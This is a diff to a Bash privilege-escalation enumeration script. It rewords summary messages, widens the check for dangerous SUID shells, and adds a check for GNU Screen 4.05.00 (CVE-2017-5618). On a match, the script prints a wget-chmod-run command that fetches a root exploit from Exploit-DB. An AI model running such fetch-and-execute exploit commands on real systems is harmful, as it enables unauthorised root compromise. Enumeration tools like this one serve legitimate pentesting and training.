@@ -46,6 +46,7 @@ suid_summary="No SUID binaries detected."
 sgid_summary="No SGID binaries detected."
 cron_summary="No writable cron jobs or misconfigurations detected."
 capabilities_summary="No dangerous file capabilities detected."
+screen_summary="Screen not vulnerable or not installed."
 writable_files_summary="No writable critical files or directories detected."
 interesting_files_summary="No interesting files detected."
 ssh_keys_summary="No SSH private keys found."
@@ -327,7 +328,7 @@ sudo_check() {
         echo -e "\e[1;33m[!] User can run the following \e[1;31msudo\e[0m \e[1;33mcommands without a password:\e[0m"
 
         # Update the summary
-        sudo_priv_summary="User has sudo privileges without a password. Review required."
+        sudo_priv_summary="User has sudo privileges without a password. Review needed."
 
         # Process the output line by line and highlight critical elements
         while IFS= read -r line; do
@@ -539,7 +540,7 @@ suid_check() {
         # Highlight common dangerous SUID binaries
         while IFS= read -r binary; do
             case "$binary" in
-                *bash|*sh|*perl|*python|*ruby|*lua)
+                *bash*|*sh*|*perl*|*python*|*ruby*|*lua*|*screen*|*tmux*|*zsh*|*dash*|*ksh*|*csh*|*tcsh*|*ash*|*fish*)
                     echo -e "    \e[1;31m$binary\e[0m (Potentially dangerous: Interpreter)"
                     ;;
                 */usr/bin/passwd|*/usr/bin/chsh|*/usr/bin/chfn|*/usr/bin/newgrp)
@@ -609,7 +610,7 @@ cron_check() {
         # Check if /etc/crontab is writable
         if [ -w /etc/crontab ]; then
             echo -e "\e[1;31m[!] /etc/crontab is writable! Potential security risk.\e[0m"
-            cron_summary="/etc/crontab is writable! Review required."
+            cron_summary="/etc/crontab is writable! Review needed."
         else
             echo -e "    \e[1;32m/etc/crontab is not writable.\e[0m"
         fi
@@ -631,7 +632,7 @@ cron_check() {
                 # Check if cron_file is writable
                 if [ -w "/etc/cron.d/$cron_file" ]; then
                     echo -e "\e[1;31m[!] /etc/cron.d/$cron_file is writable! Potential security risk.\e[0m"
-                    cron_summary="/etc/cron.d/$cron_file is writable! Review required."
+                    cron_summary="/etc/cron.d/$cron_file is writable! Review needed."
                 else
                     echo -e "    \e[1;32m/etc/crontab is not writable.\e[0m"
                 fi
@@ -652,7 +653,7 @@ cron_check() {
                 # Check if cron_file is writable
                 if [ -w "/etc/cron.daily/$cron_file" ]; then
                     echo -e "\e[1;31m[!] /etc/cron.daily/$cron_file is writable! Potential security risk.\e[0m"
-                    cron_summary="/etc/cron.daily/$cron_file is writable! Review required."
+                    cron_summary="/etc/cron.daily/$cron_file is writable! Review needed."
                 else
                     echo -e "    \e[1;32m/etc/cron.daily/$cron_file is not writable.\e[0m"
                 fi
@@ -673,7 +674,7 @@ cron_check() {
                 # Check if cron_file is writable
                 if [ -w "/var/spool/cron/crontabs/$cron_file" ]; then
                     echo -e "\e[1;31m[!] /var/spool/cron/crontabs/$cron_file is writable! Potential security risk.\e[0m"
-                    cron_summary="/etc/cron.daily/$cron_file is writable! Review required."
+                    cron_summary="/etc/cron.daily/$cron_file is writable! Review needed."
                 else
                     echo -e "    \e[1;32m/etc/cron.daily/$cron_file is not writable.\e[0m"
                 fi
@@ -705,7 +706,7 @@ cron_check() {
     else
         echo -e "\e[1;31m[!] Writable cron files detected! Potential security risk:\e[0m"
         echo "$writable_cron_files" | sed 's/^/ /'
-        cron_summary="Writable cron files detected! Review required."
+        cron_summary="Writable cron files detected! Review needed."
     fi
 
     # Give user a hint to also check for cronjobs with pspy
@@ -753,6 +754,51 @@ capabilities_check() {
 
     fi
 
+    echo -e "\e[1;32m--------------------------------------------------------------------------\e[0m"
+}
+
+# Function to check for vulnerable screen version (4.05.00 / 4.5.0)
+check_screen_vuln() {
+    echo -e "\n\n\e[1;34m[+] Checking for Vulnerable Services: Screen (4.5.0)\e[0m"
+    echo -e "\e[1;32m--------------------------------------------------------------------------\e[0m"
+    # Initialize summary
+    screen_summary="Screen not vulnerable or not installed."
+    
+    if ! command -v screen >/dev/null 2>&1; then
+        echo -e "\e[1;31m[-] Screen is not installed.\e[0m"
+        return
+    fi
+    
+    # Get screen version output
+    screen_version_output=$(screen -v 2>/dev/null)
+    if [ -z "$screen_version_output" ]; then
+        echo -e "\e[1;31m[-] Unable to retrieve screen version.\e[0m"
+        return
+    fi
+    
+    echo -e "\e[1;33mScreen Version:\e[0m $screen_version_output"
+    
+    # Parse version (e.g., extract "4.05.00" from "Screen version 4.05.00 (GNU) 10-Dec-16")
+    parsed_version=$(echo "$screen_version_output" | awk '{for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.[0-9]+\.[0-9]+$/) print $i;}' | head -1)
+    
+    if [ -z "$parsed_version" ]; then
+        echo -e "\e[1;31m[-] Could not parse screen version.\e[0m"
+        return
+    fi
+    
+    # Check if exactly 4.05.00 (vulnerable version)
+    if [[ "$parsed_version" == "4.05.00" ]]; then
+        echo -e "\e[1;31m[!] VULNERABLE: Screen version $parsed_version detected (CVE-2017-5618).\e[0m"
+        echo -e "\e[1;33m[+] This version is exploitable for root via buffer overflow.\e[0m"
+        echo -e "\e[1;36m[+] Suggestion: Download and run the exploit from Exploit-DB:\e[0m"
+        echo -e "  \e[4mwget https://www.exploit-db.com/download/41154 -O screenroot.sh\e[0m"
+        echo -e "  \e[4mchmod +x screenroot.sh && ./screenroot.sh\e[0m"
+        echo -e "  \e[4mFull Exploit: https://www.exploit-db.com/exploits/41154\e[0m"
+        screen_summary="Screen 4.5.0 vulnerable. Use screenroot.sh exploit for root. Review needed."
+    else
+        echo -e "\e[1;32m[+] Screen version $parsed_version is not vulnerable (target: 4.05.00).\e[0m"
+    fi
+    
     echo -e "\e[1;32m--------------------------------------------------------------------------\e[0m"
 }
 
@@ -1091,7 +1137,7 @@ check_writable_by_user() {
     else
         echo -e "\e[1;33m[!] Files Writable by $current_user:\e[0m"
         echo "$user_writable_files" | sed 's/^/    /'
-        writable_files_dirs_summary="Writable files detected for the current user. Review required."
+        writable_files_dirs_summary="Writable files detected for the current user. Review needed."
     fi
 
     echo -e "\n\e[1;33m[!] Searching for Directories Writable by $current_user...\e[0m"
@@ -1108,14 +1154,14 @@ check_writable_by_user() {
     else
         echo -e "\e[1;33m[!] Directories Writable by $current_user:\e[0m"
         echo "$user_writable_dirs" | sed 's/^/    /'
-        writable_files_dirs_summary="Writable directories detected for the current user. Review required."
+        writable_files_dirs_summary="Writable directories detected for the current user. Review needed."
     fi
 
     echo -e "\e[1;32m--------------------------------------------------------------------------\e[0m"
 
     # Update the summary if writable files or directories are found
     if [ -n "$user_writable_files" ] || [ -n "$user_writable_dirs" ]; then
-        writable_files_dirs_summary="Writable files and/or directories detected for the current user. Review required."
+        writable_files_dirs_summary="Writable files and/or directories detected for the current user. Review needed."
     fi
 }
 
@@ -1206,6 +1252,7 @@ print_summary() {
     echo -e "\e[1;33m[SGID Binaries]:\e[0m $(highlight_summary "$sgid_summary")"
     echo -e "\e[1;33m[Cron Jobs]:\e[0m $(highlight_summary "$cron_summary")"
     echo -e "\e[1;33m[Capabilities]:\e[0m $(highlight_summary "$capabilities_summary")"
+    echo -e "\e[1;33m[Screen Vulnerability]:\e[0m $(highlight_summary "$screen_summary")"
     echo -e "\e[1;33m[Writable Files]:\e[0m $(highlight_summary "$writable_files_dirs_summary")"
     echo -e "\e[1;33m[Interesting Files]:\e[0m $(highlight_summary "$interesting_files_summary")"
     echo -e "\e[1;33m[Sensitive Content]:\e[0m $(highlight_summary "$sensitive_content_summary")"
@@ -1324,6 +1371,12 @@ echo -e "\n"
 
 # check for files with capabilities
 capabilities_check
+
+# Add some spacing
+echo -e "\n"
+
+# check for vulnerable screen version
+check_screen_vuln
 
 # Add some spacing
 echo -e "\n"
